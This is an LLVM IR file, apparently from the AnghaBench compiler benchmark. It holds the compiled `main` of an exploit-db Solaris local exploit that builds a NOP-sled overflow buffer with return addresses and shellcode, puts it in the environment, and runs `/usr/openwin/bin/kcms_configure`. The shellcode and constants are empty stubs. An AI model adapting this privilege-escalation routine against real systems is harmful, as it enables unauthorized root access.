; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19647.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19647.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAXBUF = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"LANG=\00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c"ESP=0x%x\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@FAKEADR = common dso_local global i64 0, align 8
@RETOFS = common dso_local global i32 0, align 4
@RETADR = common dso_local global i64 0, align 8
@exploit_code = common dso_local global i32 0, align 4
@ENV = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [32 x i8] c"/usr/openwin/bin/kcms_configure\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"kcms_configure\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"1\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = load i32, i32* @MAXBUF, align 4
  %7 = zext i32 %6 to i64
  %8 = call i8* @llvm.stacksave()
  store i8* %8, i8** %1, align 8
  %9 = alloca i8, i64 %7, align 16
  store i64 %7, i64* %2, align 8
  %10 = call i32 @putenv(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %11 = call i32 (...) @get_sp()
  store i32 %11, i32* %5, align 4
  %12 = load i32, i32* %5, align 4
  %13 = call i32 @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i32 %12)
  %14 = load i32, i32* @NOP, align 4
  %15 = load i32, i32* @MAXBUF, align 4
  %16 = call i32 @memset(i8* %9, i32 %14, i32 %15)
  %17 = load i32, i32* %5, align 4
  store i32 %17, i32* %4, align 4
  %18 = load i32, i32* %4, align 4
  %19 = and i32 %18, 255
  %20 = trunc i32 %19 to i8
  %21 = load i64, i64* @FAKEADR, align 8
  %22 = getelementptr inbounds i8, i8* %9, i64 %21
  store i8 %20, i8* %22, align 1
  %23 = load i32, i32* %4, align 4
  %24 = lshr i32 %23, 8
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  %27 = load i64, i64* @FAKEADR, align 8
  %28 = add i64 %27, 1
  %29 = getelementptr inbounds i8, i8* %9, i64 %28
  store i8 %26, i8* %29, align 1
  %30 = load i32, i32* %4, align 4
  %31 = lshr i32 %30, 16
  %32 = and i32 %31, 255
  %33 = trunc i32 %32 to i8
  %34 = load i64, i64* @FAKEADR, align 8
  %35 = add i64 %34, 2
  %36 = getelementptr inbounds i8, i8* %9, i64 %35
  store i8 %33, i8* %36, align 1
  %37 = load i32, i32* %4, align 4
  %38 = lshr i32 %37, 24
  %39 = and i32 %38, 255
  %40 = trunc i32 %39 to i8
  %41 = load i64, i64* @FAKEADR, align 8
  %42 = add i64 %41, 3
  %43 = getelementptr inbounds i8, i8* %9, i64 %42
  store i8 %40, i8* %43, align 1
  %44 = load i32, i32* %5, align 4
  %45 = load i32, i32* @RETOFS, align 4
  %46 = sub i32 %44, %45
  store i32 %46, i32* %4, align 4
  %47 = load i32, i32* %4, align 4
  %48 = and i32 %47, 255
  %49 = trunc i32 %48 to i8
  %50 = load i64, i64* @RETADR, align 8
  %51 = getelementptr inbounds i8, i8* %9, i64 %50
  store i8 %49, i8* %51, align 1
  %52 = load i32, i32* %4, align 4
  %53 = lshr i32 %52, 8
  %54 = and i32 %53, 255
  %55 = trunc i32 %54 to i8
  %56 = load i64, i64* @RETADR, align 8
  %57 = add i64 %56, 1
  %58 = getelementptr inbounds i8, i8* %9, i64 %57
  store i8 %55, i8* %58, align 1
  %59 = load i32, i32* %4, align 4
  %60 = lshr i32 %59, 16
  %61 = and i32 %60, 255
  %62 = trunc i32 %61 to i8
  %63 = load i64, i64* @RETADR, align 8
  %64 = add i64 %63, 2
  %65 = getelementptr inbounds i8, i8* %9, i64 %64
  store i8 %62, i8* %65, align 1
  %66 = load i32, i32* %4, align 4
  %67 = lshr i32 %66, 24
  %68 = and i32 %67, 255
  %69 = trunc i32 %68 to i8
  %70 = load i64, i64* @RETADR, align 8
  %71 = add i64 %70, 3
  %72 = getelementptr inbounds i8, i8* %9, i64 %71
  store i8 %69, i8* %72, align 1
  %73 = getelementptr inbounds i8, i8* %9, i64 2500
  %74 = load i32, i32* @exploit_code, align 4
  %75 = load i32, i32* @exploit_code, align 4
  %76 = call i32 @strlen(i32 %75)
  %77 = call i32 @strncpy(i8* %73, i32 %74, i32 %76)
  %78 = load i32, i32* @ENV, align 4
  %79 = load i32, i32* @ENV, align 4
  %80 = call i32 @strlen(i32 %79)
  %81 = call i32 @strncpy(i8* %9, i32 %78, i32 %80)
  %82 = load i32, i32* @MAXBUF, align 4
  %83 = sub nsw i32 %82, 1
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %9, i64 %84
  store i8 0, i8* %85, align 1
  %86 = call i32 @putenv(i8* %9)
  %87 = call i32 @execl(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i32 0)
  %88 = load i8*, i8** %1, align 8
  call void @llvm.stackrestore(i8* %88)
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @putenv(i8*) #2

declare dso_local i32 @get_sp(...) #2

declare dso_local i32 @printf(i8*, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strncpy(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
